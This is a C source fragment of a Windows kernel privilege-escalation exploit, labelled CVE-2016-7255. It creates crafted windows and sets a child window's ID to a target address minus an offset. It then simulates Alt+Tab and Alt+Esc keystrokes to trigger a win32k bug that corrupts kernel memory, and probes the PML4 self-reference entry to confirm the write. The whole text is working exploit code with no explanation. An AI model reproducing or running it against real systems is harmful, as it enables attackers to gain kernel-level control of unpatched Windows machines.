int or_address_value_4(__in void* pAddress)
{
	WNDCLASSEXW stWC = { 0 };

	HWND    hWndParent = NULL;
	HWND    hWndChild = NULL;

	WCHAR*  pszClassName = L"cve-2016-7255";
	WCHAR*  pszTitleName = L"cve-2016-7255";

	void*   pId = NULL;
	MSG     stMsg = { 0 };

	UINT64 value = 0;

	do
	{

		stWC.cbSize = sizeof(stWC);
		stWC.lpfnWndProc = DefWindowProcW;
		stWC.lpszClassName = pszClassName;

		if (0 == RegisterClassExW(&stWC))
		{
			break;
		}

		hWndParent = CreateWindowExW(
			0,
			pszClassName,
			NULL,
			WS_OVERLAPPEDWINDOW | WS_VISIBLE,
			0,
			0,
			360,
			360,
			NULL,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndParent)
		{
			break;
		}

		hWndChild = CreateWindowExW(
			0,
			pszClassName,
			pszTitleName,
			WS_OVERLAPPEDWINDOW | WS_VISIBLE | WS_CHILD,
			0,
			0,
			160,
			160,
			hWndParent,
			NULL,
			GetModuleHandleW(NULL),
			NULL
		);

		if (NULL == hWndChild)
		{
			break;
		}

#ifdef _WIN64
		pId = ((UCHAR*)pAddress - 0x28);
#else
		pId = ((UCHAR*)pAddress - 0x14);
#endif // #ifdef _WIN64

		SetWindowLongPtr(hWndChild, GWLP_ID, (LONG_PTR)pId);

		DbgPrint("hWndChild = 0x%p\n", hWndChild);

		ShowWindow(hWndParent, SW_SHOWNORMAL);

		SetParent(hWndChild, GetDesktopWindow());

		SetForegroundWindow(hWndChild);

		_sim_alt_shift_tab(4);

		SwitchToThisWindow(hWndChild, TRUE);

		_sim_alt_shift_esc();

		while (GetMessage(&stMsg, NULL, 0, 0)) {
			
			SetFocus(hWndParent);
			_sim_alt_esc(20);
			SetFocus(hWndChild);
			_sim_alt_esc(20);

			TranslateMessage(&stMsg);
			DispatchMessage(&stMsg);
			
			if (value != 0) {
				break;
			}
			

			__try {
				value = *(UINT64 *)PML4_SELF_REF;
				if ((value & 0x67) == 0x67) {
					printf("Value Self Ref = %llx\n", value);
					break;
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				continue;
			}

		}


	} while (FALSE);

	if (NULL != hWndParent)
	{
		DestroyWindow(hWndParent);
		hWndParent = NULL;
	}

	if (NULL != hWndChild)
	{
		DestroyWindow(hWndChild);
		hWndChild = NULL;
	}

	UnregisterClassW(pszClassName, GetModuleHandleW(NULL));

	return 0;
}